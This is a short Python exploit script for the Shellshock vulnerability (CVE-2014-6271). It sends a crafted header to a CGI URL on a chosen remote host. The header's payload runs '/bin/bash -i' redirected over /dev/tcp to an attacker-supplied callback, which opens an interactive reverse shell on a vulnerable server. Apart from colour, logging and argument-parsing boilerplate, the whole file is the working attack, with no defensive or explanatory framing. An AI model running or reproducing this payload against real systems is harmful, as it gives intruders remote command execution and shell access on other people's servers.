__code_desc__ = """ CVE-2014-6271 cgi-bin reverse shell """
__code_version__ = 'v0.0.0'
__code_debug__ = True
__code_color_support__ = True

## Standard Libraries
import sys
import logging
import argparse
import http.client

# Third Party libraries
import colorama
from termcolor import colored

# Modules

def print_console(msg, marker="[?]", fg_color=None, bg_color=None):
    f_str = f"{marker} {msg}"
    if __code_color_support__:
        print(colored(f_str, fg_color, bg_color))
    else:
        print(f_str)

def print_verbose(msg, marker='[*]'):
    print_console(msg,marker, fg_color='cyan')

def print_info(msg, marker='[+]'):
    print_console(msg,marker, fg_color='green')

def print_error(msg, marker='[!]'):
    print_console(msg,marker, fg_color='white', bg_color='on_red')

def init_colors(b=True):
    if b:
        colorama.init()
    else:
        global __code_color_support__
        __code_color_support__ = False

def begin_logging():
    handler = logging.StreamHandler()
    handler.setFormatter(
        logging.Formatter(
            style="{",
            fmt="[{name}:{filename}] {levelname} - {message}"
        )
    )
    log = logging.getLogger(__name__)
    if __code_debug__:
        log.setLevel(logging.DEBUG)
    else:
        log.setLevel(logging.INFO)
    log.addHandler(handler)
    return log

def collect_args():
    parser = argparse.ArgumentParser(description=__code_desc__,
        formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-V', '--version', action='version', version=__code_version__)
    parser.add_argument('-v', '--verbose', action='count', default=0)
    parser.add_argument('--disable-color', action='store_true',
        help='disable colorized output (you monster))')
    parser.add_argument('rhost', default='localhost',
        help="set the remote host to test (default: %(default)s)")
    parser.add_argument('url_stub', default='/cgi-bin/test.cgi',
        help="set the url stub to test (default: %(default)s)")
    parser.add_argument('callback', default='127.0.0.1/4444',
        help="set the attacker callback in the form of ip.address/tcp_port (default: %(default)s)")
    args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])
    return parser, args

def handle_args():
    # collect parser if needed to conditionally call usage: parser.print_help()
    parser, args = collect_args()

    # negate args.disable_color; init_colors if needed
    init_colors(not args.disable_color)

    return parser, args

def main():
    log = begin_logging()
    parser, args = handle_args()
    if args.verbose:
        print_verbose(f"argparse.rhost = {args.rhost}")
        print_verbose(f"argparse.url_stub = {args.url_stub}")
        print_verbose(f"argparse.callback = {args.callback}")

    conn = http.client.HTTPConnection(args.rhost)
    reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % args.callback
    headers = {
        "Content-type": "application/x-www-form-urlencoded",
        "test":reverse_shell
    }
    conn.request("GET", args.url_stub, headers=headers)
    res = conn.getresponse()
    print(res.status, res.reason)
    data = res.read()
    print(data)

if __name__=="__main__":
    main()
